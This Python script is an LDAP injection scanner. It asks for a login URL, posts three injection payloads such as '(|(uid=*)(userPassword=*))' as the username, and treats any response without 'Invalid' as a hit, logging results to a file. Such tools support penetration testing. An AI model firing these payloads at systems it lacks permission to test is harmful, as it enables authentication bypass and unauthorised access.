import requests
import os


def save_results_to_file(base_name, results):
    results_dir = "results"
    os.makedirs(results_dir, exist_ok=True)

    count = 0
    while True:
        filename = f"{base_name}{count}.txt" if count > 0 else f"{base_name}.txt"
        filepath = os.path.join(results_dir, filename)
        if not os.path.exists(filepath):
            break
        count += 1

    try:
        with open(filepath, 'a') as f:
            for result in results:
                f.write(result + '\n')
        print(f"Results saved in {filepath}")
    except Exception as e:
        print(f"Error writing file: {e}")


def ldap_injection_scanner():
    print("LDAP Injection Vulnerability Scanner")
    target_url = input("Enter the target URL (e.g., http://example.com/login): ")

    payloads = ["*)(&)", "(|(uid=*)(userPassword=*))", "(&(objectClass=*)(uid=*))"]
    headers = {'User-Agent': 'Mozilla/5.0'}

    results = []

    for payload in payloads:
        try:
            response = requests.post(target_url, data={"user": payload, "password": "test"}, headers=headers)
            if response.status_code == 200 and "Invalid" not in response.text:
                result_str = f"LDAP Injection vulnerability detected with payload: {payload}"
                print(result_str)
                results.append(result_str)
            else:
                print(f"No LDAP Injection detected with payload: {payload}")
        except Exception as e:
            result_str = f"Error: {e}"
            print(result_str)
            results.append(result_str)

    save_results_to_file("ldap_injection_results", results)


ldap_injection_scanner()
